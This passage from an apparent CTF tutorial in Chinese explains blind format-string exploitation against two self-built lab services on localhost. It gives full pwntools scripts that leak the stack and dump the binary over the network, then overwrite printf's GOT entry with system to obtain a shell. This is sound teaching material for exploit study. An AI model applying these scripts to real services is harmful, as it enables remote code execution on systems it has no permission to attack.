爲什麼需要打印這麼多呢？因爲格式化字符串不在棧上，所以就算我們得到了需要更改的ebp的地址，也沒有辦法去把這個地址寫到棧上，利用$符號去定位他；因爲沒有辦法定位，所以沒有辦法用l\ll等方式去寫這個地址，所以只能打印很多。

## 格式化字符串盲打

### 原理

所謂格式化字符串盲打指的是隻給出可交互的 ip 地址與端口，不給出對應的 binary 文件來讓我們進行 pwn，其實這個和 BROP 差不多，不過 BROP 利用的是棧溢出，而這裏我們利用的是格式化字符串漏洞。一般來說，我們按照如下步驟進行

- 確定程序的位數
- 確定漏洞位置 
- 利用

由於沒找到比賽後給源碼的題目，所以自己簡單構造了兩道題。

### 例子1-泄露棧

源碼和部署文件均放在了對應的文件夾 [fmt_blind_stack](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack) 中。

#### 確定程序位數

我們隨便輸入了 %p，程序回顯如下信息

```shell
➜  blind_fmt_stack git:(master) ✗ nc localhost 9999
%p
0x7ffd4799beb0
G�flag is on the stack%                          
```

告訴我們 flag 在棧上，同時知道了該程序是 64 位的，而且應該有格式化字符串漏洞。

#### 利用

那我們就一點一點測試看看

```python
from pwn import *
context.log_level = 'error'


def leak(payload):
    sh = remote('127.0.0.1', 9999)
    sh.sendline(payload)
    data = sh.recvuntil('\n', drop=True)
    if data.startswith('0x'):
        print p64(int(data, 16))
    sh.close()


i = 1
while 1:
    payload = '%{}$p'.format(i)
    leak(payload)
    i += 1

```

最後在輸出中簡單看了看，得到 flag

```shell
////////
////////
\x00\x00\x00\x00\x00\x00\x00\xff
flag{thi
s_is_fla
g}\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\xfe\x7f\x00\x00
```

### 例子2-盲打劫持got

源碼以及部署文件均已經在 [blind_fmt_got](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_got) 文件夾中。

#### 確定程序位數

通過簡單地測試，我們發現這個程序是格式化字符串漏洞函數，並且程序爲 64 位。

```shell
➜  blind_fmt_got git:(master) ✗ nc localhost 9999
%p
0x7fff3b9774c0
```

這次啥也沒有回顯，又試了試，發現也沒啥情況，那我們就只好來泄露一波源程序了。

#### 確定偏移

在泄露程序之前，我們還是得確定一下格式化字符串的偏移，如下

```shell
➜  blind_fmt_got git:(master) ✗ nc localhost 9999
aaaaaaaa%p%p%p%p%p%p%p%p%p
aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025
```

據此，我們可以知道格式化字符串的起始地址偏移爲 6。

#### 泄露binary

由於程序是64位，所以我們從 0x400000 處開始泄露。一般來說有格式化字符串漏洞的盲打都是可以讀入 '\x00' 字符的，，不然沒法泄露怎麼玩，，除此之後，輸出必然是 '\x00' 截斷的，這是因爲格式化字符串漏洞利用的輸出函數均是 '\x00' 截斷的。。所以我們可以利用如下的泄露代碼。

```python
##coding=utf8
from pwn import *

##context.log_level = 'debug'
ip = "127.0.0.1"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # 說明有\n，出現新的一行
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None

def getbinary():
	addr = 0x400000
	f = open('binary', 'w')
	while addr < 0x401000:
		data = leak(addr)
		if data is None:
			f.write('\xff')
			addr += 1
		elif len(data) == 0:
			f.write('\x00')
			addr += 1
		else:
			f.write(data)
			addr += len(data)
	f.close()
getbinary()
```

需要注意的是，在 payload 中需要判斷是否有 '\n' 出現，因爲這樣會導致源程序只讀取前面的內容，而沒有辦法泄露內存，所以需要跳過這樣的地址。

#### 分析binary

利用 IDA 打開泄露的 binary ，改變程序基地址，然後簡單看看，可以基本確定源程序 main 函數的地址

```asm
seg000:00000000004005F6                 push    rbp
seg000:00000000004005F7                 mov     rbp, rsp
seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h
seg000:00000000004005FE
seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j
seg000:00000000004005FE                 lea     rax, [rbp-80h]
seg000:0000000000400602                 mov     edx, 80h ; '€'
seg000:0000000000400607                 mov     rsi, rax
seg000:000000000040060A                 mov     edi, 0
seg000:000000000040060F                 mov     eax, 0
seg000:0000000000400614                 call    sub_4004C0
seg000:0000000000400619                 lea     rax, [rbp-80h]
seg000:000000000040061D                 mov     rdi, rax
seg000:0000000000400620                 mov     eax, 0
seg000:0000000000400625                 call    sub_4004B0
seg000:000000000040062A                 mov     rax, cs:601048h
seg000:0000000000400631                 mov     rdi, rax
seg000:0000000000400634                 call    near ptr unk_4004E0
seg000:0000000000400639                 jmp     short loc_4005FE
```

可以基本確定的是 sub\_4004C0 爲 read 函數，因爲讀入函數一共有三個參數的話，基本就是 read 了。此外，下面調用的 sub\_4004B0 應該就是輸出函數了，再之後應該又調用了一個函數，此後又重新跳到讀入函數處，那程序應該是一個 while 1 的循環，一直在執行。

#### 利用思路

分析完上面的之後，我們可以確定如下基本思路

- 泄露 printf 函數的地址，
- 獲取對應 libc 以及 system 函數地址
- 修改 printf 地址爲 system 函數地址
- 讀入 /bin/sh; 以便於獲取 shell

#### 利用程序

程序如下。

```python
##coding=utf8
import math
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
context.arch = 'amd64'
ip = "127.0.0.1"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # 說明有\n，出現新的一行
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None


def getbinary():
    addr = 0x400000
    f = open('binary', 'w')
    while addr < 0x401000:
        data = leak(addr)
        if data is None:
            f.write('\xff')
            addr += 1
        elif len(data) == 0:
            f.write('\x00')
            addr += 1
        else:
            f.write(data)
            addr += len(data)
    f.close()


##getbinary()
read_got = 0x601020
printf_got = 0x601018
sh = remote(ip, port)
## let the read get resolved
sh.sendline('a')
sh.recv()
## get printf addr
payload = '%00008$s' + 'STARTEND' + p64(read_got)
sh.sendline(payload)
data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\x00')
sh.recv()
read_addr = u64(data)

## get system addr
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
log.success('system addr: ' + hex(system_addr))
log.success('read   addr: ' + hex(read_addr))
## modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
## get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()

## get shell
sh.sendline('/bin/sh;')
sh.interactive()
```

這裏需要注意的是這一段代碼

```python
## modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
## get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()
```

fmtstr\_payload 直接得到的 payload 會將地址放在前面，而這個會導致 printf 的時候 '\x00' 截斷（**關於這一問題，pwntools目前正在開發 fmt\_payload 的加強版，估計快開發出來了。**）。所以我使用了一些技巧將它放在後面了。主要的思想是，將地址放在後面 8 字節對齊的地方，並對 payload 中的偏移進行修改。需要注意的是

```python
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
```

這一行給出了修改後的地址在格式化字符串中的偏移，之所以是這樣在於無論如何修改，由於 '%order$hn' 中 order 多出來的字符都不會大於 8。具體的可以自行推導。

### 題目
- SuCTF2018 - lock2 （主辦方提供了 docker 鏡像: suctf/2018-pwn-lock2）
